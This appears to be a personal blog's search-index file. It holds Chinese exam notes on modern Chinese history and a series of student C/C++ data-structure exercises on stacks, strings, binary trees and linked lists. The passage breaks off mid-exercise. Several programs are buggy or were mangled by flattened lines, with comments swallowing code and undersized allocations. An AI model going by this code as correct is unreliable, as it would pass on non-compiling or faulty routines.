<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>中国近代史纲要</title>
      <link href="/2021/12/02/%E4%B8%AD%E5%9B%BD%E8%BF%91%E4%BB%A3%E5%8F%B2%E7%BA%B2%E8%A6%81/"/>
      <url>/2021/12/02/%E4%B8%AD%E5%9B%BD%E8%BF%91%E4%BB%A3%E5%8F%B2%E7%BA%B2%E8%A6%81/</url>
      
        <content type="html"><![CDATA[<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">中国近代史纲要</span><br><span class="line"></span><br><span class="line">1. 如何理解“鸦片战争”以后中国社会发生的两个根本性变化？</span><br><span class="line">   解答：</span><br><span class="line">   其一，独立的中国逐步变成半殖民地的中国；</span><br><span class="line">   其二，封建的中国逐步变成半封建的中国。</span><br><span class="line"></span><br><span class="line">2. 怎样理解近代中国的两大任务及其关系？</span><br><span class="line">   解答：</span><br><span class="line">   （1）近代中国面对着两大历史任务：</span><br><span class="line">           一是求得民族独立和人民解放；二是实现国家的繁荣富强和人民的共同富裕。</span><br><span class="line">   （2）两大任务的关系：两者的主题、内容不一样，不能相互替代；</span><br><span class="line">          但又紧密联系，息息相关，不能分离。第一，求得民族独立和人民解放，是要改变民族遭压迫、</span><br><span class="line">          人民受剥削的地位和状况，是要从根本上推翻半殖民地半封建的统治秩序，解决生产关系的问题。</span><br><span class="line">          由于腐败的社会制度束缚着生产力的发展，阻碍着经济技术的进步，必须首先改变这种社会制度，</span><br><span class="line">          争得民族的独立和人民解放，才能为实现国家富强和人民富裕创造前提，开辟道路。</span><br><span class="line">          第二，实现国家繁荣富强和人民共同富裕，是要改变近代中国经济、文化落后的地位和状况，</span><br><span class="line">          是要充分发展以近代工业为主的社会生产力，解决生产力的问题，实现中国的现代化。</span><br><span class="line">          前一个任务为后一个任务扫清障碍，创造必要的前提；后一个任务是前一个任务的延续和追求的目标。</span><br><span class="line"></span><br><span class="line">3. 帝国主义列强瓜分中国图谋破产的原因：</span><br><span class="line">   其一，帝国主义列强之间的矛盾和相互制约是重要原因；</span><br><span class="line">   其二，中华民族进行的不屈不挠的反侵略斗争是列强不能灭亡中国和瓜分中国的根本原因。</span><br><span class="line"></span><br><span class="line">4. “师夷长技以制夷”的中心思想及其意义：</span><br><span class="line">   主张学习外国先进的军事和科学技术，以期富国强兵，抵御外国侵略，开创了中国近代向西方学习的新风。</span><br><span class="line"></span><br><span class="line">5. 《天朝田亩制度》：</span><br><span class="line">   是一个以解决农民土地问题为中心，比较完整的社会改革纲领。</span><br><span class="line">   它确定了平均分配土地的方案，主张“凡天下田，天下人同耕”；</span><br><span class="line">   主张建立圣库制度，达到“无处不均匀，无人不饱暖”的理想社会。</span><br><span class="line">   这些主张从根本上否定了封建地主的土地所有制，具有进步意义，但没有超出农民小生产者的狭隘眼界，</span><br><span class="line">   他们描绘的理想天国具有不切实际的空想性质，不可能实现。</span><br><span class="line"></span><br><span class="line">6. “洋务运动”（性质、时间、目的、指导思想、内容、意义）：</span><br><span class="line">   指19世纪60—90年代，清朝统治阶级中的部分成员，</span><br><span class="line">   如奕、曾国潘、李鸿章、左宗棠、张之洞等为了拯救清政府的统治危机，主张学习西方的武器装备和科学技术，</span><br><span class="line">   以引进枪炮、科技，创办一批近代企业、新式学堂、新式海军等为主要内容的的学习西方的运动，</span><br><span class="line">   其指导思想是“中学为体，西学为用”。</span><br><span class="line">   洋务运动在客观上对中国的早期工业和民族资本主义的发展起了某些促进作用。</span><br><span class="line">   但由于它带有浓厚的封建性，对外国的依赖性和企业管理的腐朽性，因而失败。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//0、从键盘上输入一串括号组成的字符串，试编写一个算法，判断所输入的括号是否匹配</span><br><span class="line"></span><br><span class="line"># include &lt;iostream&gt;</span><br><span class="line"></span><br><span class="line"># include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line"># include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line"># include &lt;string.h&gt;</span><br><span class="line"></span><br><span class="line">#define M 100 </span><br><span class="line"></span><br><span class="line">using namespace std;</span><br><span class="line"></span><br><span class="line">typedef struct Stack</span><br><span class="line">&#123;</span><br><span class="line">char *base;</span><br><span class="line">char *top;</span><br><span class="line">int stacksize;</span><br><span class="line">&#125;sqstack;</span><br><span class="line"></span><br><span class="line">void createsqstack(sqstack &amp;s)</span><br><span class="line">&#123;</span><br><span class="line">s.base = (char*) malloc (M * sizeof(char));</span><br><span class="line">s.top = s.base;</span><br><span class="line">s.stacksize = M;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void push(sqstack &amp;s, char ch)//入栈</span><br><span class="line">&#123;</span><br><span class="line">if(s.top - s.base &gt;= M)</span><br><span class="line">&#123;</span><br><span class="line">printf(&quot;该栈已满。\n&quot;);</span><br><span class="line">&#125;</span><br><span class="line">*s.top++ = ch;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">char pop(sqstack &amp;s)//出栈</span><br><span class="line">&#123;</span><br><span class="line">if(s.top == s.base)</span><br><span class="line">&#123;</span><br><span class="line">return &#x27;#&#x27;;</span><br><span class="line">//printf(&quot;该栈已空。&quot;);</span><br><span class="line">&#125;</span><br><span class="line">return *--s.top;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">char gettop(sqstack &amp;s)//取栈顶元素</span><br><span class="line">&#123;</span><br><span class="line">if(s.top == s.base)</span><br><span class="line">//printf(&quot;该栈已空。&quot;);</span><br><span class="line">return &#x27;#&#x27;;</span><br><span class="line">return *(s.top - 1);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">bool match(sqstack &amp;s, char* str)</span><br><span class="line">&#123;</span><br><span class="line">push(s, str[0]);//将数组第一个元素压栈</span><br><span class="line">for(int i = 1; i&lt;strlen(str); i++)</span><br><span class="line">&#123;</span><br><span class="line">char flag = gettop(s);//取栈顶元素</span><br><span class="line">switch(flag)</span><br><span class="line">&#123;</span><br><span class="line">case&#x27;(&#x27;:</span><br><span class="line">if(str[i] == &#x27;)&#x27;)</span><br><span class="line">pop(s);</span><br><span class="line">else</span><br><span class="line">push(s, str[i]);</span><br><span class="line">break;</span><br><span class="line">case&#x27;[&#x27;:</span><br><span class="line">if(str[i] == &#x27;]&#x27;)</span><br><span class="line">pop(s);</span><br><span class="line">else</span><br><span class="line">push(s, str[i]);</span><br><span class="line">break;</span><br><span class="line">case&#x27;#&#x27;:</span><br><span class="line">if(str[i] == &#x27;(&#x27; || str[i] == &#x27;[&#x27;)</span><br><span class="line">push(s, str[i]);</span><br><span class="line">break;</span><br><span class="line">default:</span><br><span class="line">break;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(s.base == s.top)</span><br><span class="line">return true;</span><br><span class="line">else </span><br><span class="line">return false;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">Stack s;</span><br><span class="line">//int n;</span><br><span class="line">//char ch;</span><br><span class="line">char str[100];</span><br><span class="line"></span><br><span class="line">printf(&quot;请输入字符串：\n&quot;);</span><br><span class="line">scanf(&quot;%s&quot;, str);</span><br><span class="line"></span><br><span class="line">createsqstack(s);</span><br><span class="line">bool conclusion = match(s, str);</span><br><span class="line">if(conclusion == true)</span><br><span class="line">printf(&quot;1\n&quot;);</span><br><span class="line">else</span><br><span class="line">printf(&quot;0\n&quot;);</span><br><span class="line">return 0;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//1、从键盘上输入一个十进制数n，试编写一个算法，将其转换成对应的ｐ进制输出</span><br><span class="line"></span><br><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">#include&lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">#include&lt;math.h&gt;</span><br><span class="line"></span><br><span class="line">#define error 0</span><br><span class="line"></span><br><span class="line">#define ok 1</span><br><span class="line"></span><br><span class="line">#define overflow -2</span><br><span class="line"></span><br><span class="line">#define M 100</span><br><span class="line"></span><br><span class="line">typedef int selemtype;</span><br><span class="line">typedef int status;</span><br><span class="line"></span><br><span class="line">typedef struct stack</span><br><span class="line">&#123;</span><br><span class="line">selemtype *base;</span><br><span class="line">selemtype *top;</span><br><span class="line">int stacksize;</span><br><span class="line">&#125;sqstack;</span><br><span class="line"></span><br><span class="line">status initsqstack(sqstack &amp;s)</span><br><span class="line">&#123;</span><br><span class="line">s.base = (selemtype*)malloc(M * sizeof(selemtype));</span><br><span class="line">if (!s.base)exit(overflow);</span><br><span class="line">s.top = s.base;</span><br><span class="line">s.stacksize = M;</span><br><span class="line">return ok;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">status push(sqstack &amp;s, selemtype e)//压栈</span><br><span class="line">&#123;</span><br><span class="line">if (s.top - s.base &gt;= s.stacksize - 1)return error;</span><br><span class="line">*s.top++ = e;</span><br><span class="line">return ok;</span><br><span class="line">&#125;</span><br><span class="line">status pop(sqstack &amp;s, selemtype &amp;e)//弹栈</span><br><span class="line">&#123;</span><br><span class="line">if (s.base == s.top)return error;</span><br><span class="line">e = *--s.top;</span><br><span class="line">return ok;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">int stackempty(sqstack s)//判断空栈</span><br><span class="line">&#123;</span><br><span class="line">if (s.top == s.base)return 1;</span><br><span class="line">else return 0;</span><br><span class="line">&#125;</span><br><span class="line">void conversion(sqstack &amp;s,int a,int n)//进制转换</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">while(a)</span><br><span class="line">&#123;</span><br><span class="line">push(s,a%n);</span><br><span class="line">a/=n;</span><br><span class="line">&#125;</span><br><span class="line">int e;</span><br><span class="line">printf(&quot;十进制转化为%d进制为：\n&quot;,n);</span><br><span class="line">while(!stackempty(s))</span><br><span class="line">&#123;</span><br><span class="line">pop(s,e);</span><br><span class="line">if(e&gt;9)//十六进制时输出字母</span><br><span class="line">&#123;</span><br><span class="line">e=e+55;</span><br><span class="line">printf(&quot;%c&quot;,e);</span><br><span class="line">&#125;</span><br><span class="line"> else</span><br><span class="line">printf(&quot;%d&quot;,e);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">​</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">void main()</span><br><span class="line">&#123;</span><br><span class="line">int p;</span><br><span class="line">sqstack s;</span><br><span class="line">selemtype e;</span><br><span class="line">initsqstack(s);</span><br><span class="line">while (1)</span><br><span class="line">&#123;</span><br><span class="line">printf(&quot;输入一位十进制数和需要转换的进制数：\n&quot;);</span><br><span class="line">scanf(&quot;%d%d&quot;, &amp;e,&amp;p);</span><br><span class="line"></span><br><span class="line">conversion(s,e,p);</span><br><span class="line">printf(&quot;\n&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//2、从键盘上输入二个定长串s1与s2，试编写一个算法判断s1是否是s2的子串，如果是则输出１否则输出０</span><br><span class="line"></span><br><span class="line"># include &lt;iostream&gt;</span><br><span class="line"></span><br><span class="line"># include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line"># include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line"># include &lt;string.h&gt; </span><br><span class="line"></span><br><span class="line">using namespace std;</span><br><span class="line">const int maxn = 100 + 10;</span><br><span class="line"></span><br><span class="line">typedef char sstring[maxn];</span><br><span class="line"></span><br><span class="line">void createstring(sstring s, char* str)</span><br><span class="line">&#123;</span><br><span class="line">s[0] = strlen(str);</span><br><span class="line"></span><br><span class="line">for(int i= 1; i&lt;=s[0]; i++)</span><br><span class="line">&#123;</span><br><span class="line">s[i] = str[i-1];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void printstring(sstring s)</span><br><span class="line">&#123;</span><br><span class="line">for(int i = 1; i&lt;=s[0]; i++)</span><br><span class="line">&#123;</span><br><span class="line">printf(&quot;%c &quot;, s[i]);</span><br><span class="line">&#125;</span><br><span class="line">printf(&quot;\n&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">bool sstring_match(sstring s1, sstring s2)</span><br><span class="line">&#123;</span><br><span class="line">int i, j;</span><br><span class="line">i = j = 1;</span><br><span class="line"></span><br><span class="line">while(i &lt;= s1[0] &amp;&amp; j&lt;=s2[0])</span><br><span class="line">&#123;</span><br><span class="line">if(s1[i] == s2[j])</span><br><span class="line">&#123;</span><br><span class="line">i++;</span><br><span class="line">j++;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">i = i - j + 2;</span><br><span class="line">j = 1;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(j&lt;s2[0])</span><br><span class="line">return true;</span><br><span class="line">else </span><br><span class="line">return false;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">char str1[maxn], str2[maxn];</span><br><span class="line">sstring s1, s2;</span><br><span class="line"></span><br><span class="line">printf(&quot;请创建第一个定长串s1:\n&quot;);</span><br><span class="line">scanf(&quot;%s&quot;, str1);</span><br><span class="line">getchar();</span><br><span class="line"></span><br><span class="line">printf(&quot;请创建第二个定长串s2:\n&quot;);</span><br><span class="line">scanf(&quot;%s&quot;, str2);</span><br><span class="line"></span><br><span class="line">createstring(s1, str1);</span><br><span class="line">createstring(s2, str2);</span><br><span class="line"></span><br><span class="line">bool is_sstring_match = sstring_match(s1, s2);</span><br><span class="line"></span><br><span class="line">if(is_sstring_match)</span><br><span class="line">printf(&quot;1\n&quot;);</span><br><span class="line">else </span><br><span class="line">printf(&quot;0\n&quot;);</span><br><span class="line"></span><br><span class="line">return 0;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//3、假设二叉树采用二叉链表存储结构，试设计一个算法求二叉树的叶子结点数并输出所有的叶子结点。</span><br><span class="line"></span><br><span class="line"># include &lt;iostream&gt;</span><br><span class="line"></span><br><span class="line"># include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line"># include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">using namespace std;</span><br><span class="line"></span><br><span class="line">int ans = 0;</span><br><span class="line"></span><br><span class="line">typedef struct Bitree</span><br><span class="line">&#123;</span><br><span class="line">char data;</span><br><span class="line">struct Bitree* lchild;</span><br><span class="line">struct Bitree* rchild;</span><br><span class="line">&#125;*bitree;</span><br><span class="line"></span><br><span class="line">void createbitree(bitree &amp; t)</span><br><span class="line">&#123;</span><br><span class="line">char ch;</span><br><span class="line">ch = getchar();</span><br><span class="line"></span><br><span class="line">if(ch == &#x27; &#x27;)</span><br><span class="line">&#123;</span><br><span class="line">t = NULL;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">t = (bitree) malloc (sizeof(bitree));</span><br><span class="line">t-&gt;data = ch;</span><br><span class="line">createbitree(t-&gt;lchild);</span><br><span class="line">createbitree(t-&gt;rchild);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void printtree(bitree t)</span><br><span class="line">&#123;</span><br><span class="line">if(t-&gt;lchild == NULL &amp;&amp; t-&gt;rchild == NULL)</span><br><span class="line">&#123;</span><br><span class="line">printf(&quot;%c &quot;, t-&gt;data);</span><br><span class="line">ans++;</span><br><span class="line">return ;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(t-&gt;lchild == NULL)&#123;printtree(t-&gt;rchild);&#125;else&#123;if(t-&gt;rchild == NULL)&#123;printtree(t-&gt;lchild);&#125;else&#123;printtree(t-&gt;lchild);printtree(t-&gt;rchild);&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">bitree t;</span><br><span class="line"></span><br><span class="line">printf(&quot;请输入以先序顺序创建的树的字母序列：\n&quot;);createbitree(t);printtree(t);printf(&quot;\n&quot;);printf(&quot;叶子结点数目：%d\n&quot;, ans);return 0;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//4、假设二叉树采用二叉链表存储结构，试设计一个算法求二叉树的高度。</span><br><span class="line"></span><br><span class="line"># include &lt;iostream&gt;</span><br><span class="line"></span><br><span class="line"># include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line"># include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">using namespace std;</span><br><span class="line"></span><br><span class="line">typedef struct Bitree</span><br><span class="line">&#123;</span><br><span class="line">char data;</span><br><span class="line">struct Bitree* lchild;</span><br><span class="line">struct Bitree* rchild;</span><br><span class="line">&#125;*bitree;</span><br><span class="line"></span><br><span class="line">void createbitree(bitree &amp;t)</span><br><span class="line">&#123;</span><br><span class="line">char ch;</span><br><span class="line">ch = getchar();</span><br><span class="line"></span><br><span class="line">if(ch == &#x27; &#x27;)t = NULL;else&#123;t = (bitree) malloc(sizeof(bitree));t-&gt;data = ch;createbitree(t-&gt;lchild);createbitree(t-&gt;rchild);&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int height(bitree t)</span><br><span class="line">&#123;</span><br><span class="line">int a, b, max;</span><br><span class="line"></span><br><span class="line">if(t)&#123;a = height(t-&gt;lchild);b = height(t-&gt;rchild);max = a&gt;b ? a : b;return (max+1);&#125;elsereturn 0;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">bitree t;</span><br><span class="line">printf(&quot;请输入以先序建树的字母序列：\n&quot;);</span><br><span class="line">createbitree(t);</span><br><span class="line">printf(&quot;树的高度为：%d&quot;, height(t));</span><br><span class="line">printf(&quot;\n&quot;);</span><br><span class="line"></span><br><span class="line">return 0;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//5、已知一个带头结点的单链表la，其中la=&#123;a1,a2,...an&#125;， 试设计一个算法将其中从小到大进行排序 ，再输出</span><br><span class="line"></span><br><span class="line"># include &lt;iostream&gt;</span><br><span class="line"></span><br><span class="line"># include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line"># include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">using namespace std;</span><br><span class="line"></span><br><span class="line">typedef struct Node</span><br><span class="line">&#123;</span><br><span class="line">int elem;</span><br><span class="line">struct Node* next;</span><br><span class="line">&#125;*linklist;</span><br><span class="line"></span><br><span class="line">void inlinklist(linklist &amp;l, int n)</span><br><span class="line">&#123;</span><br><span class="line">l = (linklist) malloc (sizeof(Node));</span><br><span class="line">l-&gt;next = NULL;</span><br><span class="line">linklist p, end;</span><br><span class="line">end = l;</span><br><span class="line"></span><br><span class="line">printf(&quot;请输入链表中的元素：\n&quot;);for(int i = 0; i&lt;n; i++)&#123;p = (linklist) malloc (sizeof(Node));scanf(&quot;%d&quot;, &amp;p-&gt;elem);end-&gt;next = p;p-&gt;next = NULL;end = p;&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void outlinklist(linklist l)</span><br><span class="line">&#123;</span><br><span class="line">printf(&quot;链表中的元素为：\n&quot;);</span><br><span class="line">linklist p;</span><br><span class="line">p = l-&gt;next;</span><br><span class="line"></span><br><span class="line">while(p != NULL)&#123;printf(&quot;%d &quot;, p-&gt;elem);p = p-&gt;next;&#125;printf(&quot;\n&quot;);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void swap(int *a, int *b)</span><br><span class="line">&#123;</span><br><span class="line">int temp;</span><br><span class="line">temp = *a;</span><br><span class="line">*a = *b;</span><br><span class="line">*b = temp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void sortlinklist(linklist &amp;l)</span><br><span class="line">&#123;</span><br><span class="line">linklist p, s;</span><br><span class="line">s = p = l-&gt;next;</span><br><span class="line"></span><br><span class="line">while(s)//表示前边节点i&#123;p = s;while(p)//表示后边节点i+1&#123;if(s-&gt;elem &gt; p-&gt;elem)swap(&amp;s-&gt;elem, &amp;p-&gt;elem);p = p-&gt;next;&#125;s = s-&gt;next;&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">linklist l;</span><br><span class="line">int n;</span><br><span class="line"></span><br><span class="line">printf(&quot;请输入链表的元素个数：\n&quot;);scanf(&quot;%d&quot;, &amp;n);inlinklist(l, n);sortlinklist(l);outlinklist(l);return 0;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//6、已知二个单向有序链表la与lb，其中la=&#123;a1,a2,...an&#125;，lb=&#123;b1,b2,...bm&#125;， 试设计一个算法将它们合并到单链表lc中，且lc仍然有序，再输出 。</span><br><span class="line"></span><br><span class="line"># include &lt;iostream&gt;</span><br><span class="line"></span><br><span class="line"># include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line"># include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">using namespace std;</span><br><span class="line"></span><br><span class="line">typedef struct Node </span><br><span class="line">&#123;</span><br><span class="line">int elem;</span><br><span class="line">struct Node *next;</span><br><span class="line">&#125;*linklist;</span><br><span class="line"></span><br><span class="line">void inlinklist(linklist &amp;l, int n)</span><br><span class="line">&#123;</span><br><span class="line">l = (linklist) malloc (sizeof(Node));</span><br><span class="line">l-&gt;next = NULL;</span><br><span class="line">linklist p, end;</span><br><span class="line">end = l;</span><br><span class="line"></span><br><span class="line">printf(&quot;请输入链表中的元素：\n&quot;);for(int i = 0; i&lt;n; i++)&#123;p = (linklist) malloc (sizeof(Node));scanf(&quot;%d&quot;, &amp;p-&gt;elem);end-&gt;next = p;p-&gt;next = NULL;end = p;&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void outlinklist(linklist l)</span><br><span class="line">&#123;</span><br><span class="line">printf(&quot;链表中的元素为：\n&quot;);</span><br><span class="line">linklist p;</span><br><span class="line">p = l-&gt;next;</span><br><span class="line"></span><br><span class="line">while(p != NULL)&#123;printf(&quot;%d &quot;, p-&gt;elem);p = p-&gt;next;&#125;printf(&quot;\n&quot;);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void swap(linklist&amp; a, linklist &amp;s)</span><br><span class="line">&#123;</span><br><span class="line">s-&gt;next = a;</span><br><span class="line">s = a;</span><br><span class="line">a = a-&gt;next;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void mergerlinklist(linklist &amp;l1, linklist &amp;l2, linklist &amp;l3)</span><br><span class="line">&#123;</span><br><span class="line">l3 = (linklist) malloc (sizeof(Node));</span><br><span class="line">linklist a, b, c;</span><br><span class="line">a = l1-&gt;next;</span><br><span class="line">b = l2-&gt;next;</span><br><span class="line">c = l3;</span><br><span class="line"></span><br><span class="line">while(a &amp;&amp; b)&#123;if(a-&gt;elem &gt; b-&gt;elem)&#123;//c-&gt;next = b;//b = b-&gt;next;//c = c-&gt;next;swap(b, c);&#125;else&#123;//c-&gt;next = a;//a = a-&gt;next;//c = c-&gt;next;swap(a, c);&#125;&#125;c-&gt;next = a ? a : b;/*while(a)&#123;c-&gt;next = a;c = c-&gt;next;a = a-&gt;next;&#125;while(b)&#123;c-&gt;next = b;c = c-&gt;next;b = b-&gt;next;&#125;c-&gt;next = NULL;*/</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">linklist l1, l2, l3;</span><br><span class="line">int n, m;</span><br><span class="line"></span><br><span class="line">printf(&quot;请输入链表的元素个数：\n&quot;);scanf(&quot;%d%d&quot;, &amp;n, &amp;m);inlinklist(l1, n);inlinklist(l2, m);mergerlinklist(l1, l2, l3);outlinklist(l3);return 0;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//7、设计一个算法实现在带头结点的单向链表中删除给定值的结点。（链表中的数据元素值均不相同）</span><br><span class="line"></span><br><span class="line"># include &lt;iostream&gt;</span><br><span class="line"></span><br><span class="line"># include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line"># include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">using namespace std;</span><br><span class="line"></span><br><span class="line">typedef struct Node</span><br><span class="line">&#123;</span><br><span class="line">int elem;</span><br><span class="line">struct Node* next;</span><br><span class="line">&#125;*linklist;</span><br><span class="line"></span><br><span class="line">void inlinklist(linklist &amp;l, int n)</span><br><span class="line">&#123;</span><br><span class="line">l = (linklist) malloc (sizeof(Node));</span><br><span class="line">l-&gt;next = NULL;</span><br><span class="line">linklist end, p;</span><br><span class="line">end = l;</span><br><span class="line"></span><br><span class="line">printf(&quot;请输入链表中的元素：\n&quot;);for(int i = 0; i&lt;n; i++)&#123;p = (linklist) malloc (sizeof(Node));scanf(&quot;%d&quot;, &amp;p-&gt;elem);end-&gt;next = p;p-&gt;next = NULL;end = p;&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void outlinklist(linklist l)</span><br><span class="line">&#123;</span><br><span class="line">printf(&quot;链表中的元素为：\n&quot;);</span><br><span class="line">linklist p;</span><br><span class="line">p = l-&gt;next;</span><br><span class="line"></span><br><span class="line">while(p)&#123;printf(&quot;%d &quot;, p-&gt;elem);p = p-&gt;next;&#125;printf(&quot;\n&quot;);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void deletelinklist(linklist &amp;l, int x)</span><br><span class="line">&#123;</span><br><span class="line">linklist p, s;</span><br><span class="line">p = s = l;</span><br><span class="line"></span><br><span class="line">while(p-&gt;elem != x)&#123;s = p;p = p-&gt;next;&#125;//执行结果是p指向p-&gt;elem = x;s指向目标节点的前一个节点if(p)&#123;s-&gt;next = p-&gt;next;free(p);&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">linklist l;</span><br><span class="line">int n, m;</span><br><span class="line"></span><br><span class="line">printf(&quot;请输入链表的元素个数：\n&quot;);scanf(&quot;%d&quot;, &amp;n);inlinklist(l, n);printf(&quot;请输入要删除的值m:\n&quot;);scanf(&quot;%d&quot;, &amp;m);deletelinklist(l, m);outlinklist(l);return 0;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//8、试设计一个算法，将单链表中值最小的那个结点删除。</span><br><span class="line"></span><br><span class="line"># include &lt;iostream&gt;</span><br><span class="line"></span><br><span class="line"># include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line"># include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">using namespace std;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">typedef struct Node</span><br><span class="line">&#123;</span><br><span class="line">int elem;</span><br><span class="line">struct Node* next;</span><br><span class="line">&#125;*linklist;</span><br><span class="line"></span><br><span class="line">void inlinklist(linklist &amp;l, int n)</span><br><span class="line">&#123;</span><br><span class="line">l = (linklist) malloc (sizeof(Node));</span><br><span class="line">l-&gt;next = NULL;</span><br><span class="line">linklist p, end;</span><br><span class="line">end = l;</span><br><span class="line"></span><br><span class="line">printf(&quot;请输入链表中的元素值：\n&quot;);for(int i = 0; i&lt;n; i++)&#123;p = (linklist) malloc (sizeof(Node));scanf(&quot;%d&quot;, &amp;p-&gt;elem);end-&gt;next = p;p-&gt;next = NULL;end = p;&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void outlinklist(linklist l)</span><br><span class="line">&#123;</span><br><span class="line">printf(&quot;链表中的元素为:\n&quot;);</span><br><span class="line">linklist p;</span><br><span class="line">p = l-&gt;next;</span><br><span class="line"></span><br><span class="line">while(p)&#123;printf(&quot;%d &quot;, p-&gt;elem);p = p-&gt;next;&#125;printf(&quot;\n&quot;);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void deletelinklist(linklist &amp;l)</span><br><span class="line">&#123;</span><br><span class="line">linklist cur, precur, min, premin;</span><br><span class="line"></span><br><span class="line">cur = min = precur = premin = l;cur = l-&gt;next;min = l-&gt;next;while(cur != NULL)&#123;if(cur-&gt;elem &lt; min-&gt;elem)&#123;premin = precur;min = cur;&#125;precur = cur;cur = cur-&gt;next;&#125;linklist p;p = min;premin-&gt;next = min-&gt;next;free(p);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">linklist l;</span><br><span class="line">int n;</span><br><span class="line"></span><br><span class="line">printf(&quot;请输入链表的元素个数：\n&quot;);scanf(&quot;%d&quot;, &amp;n);inlinklist(l, 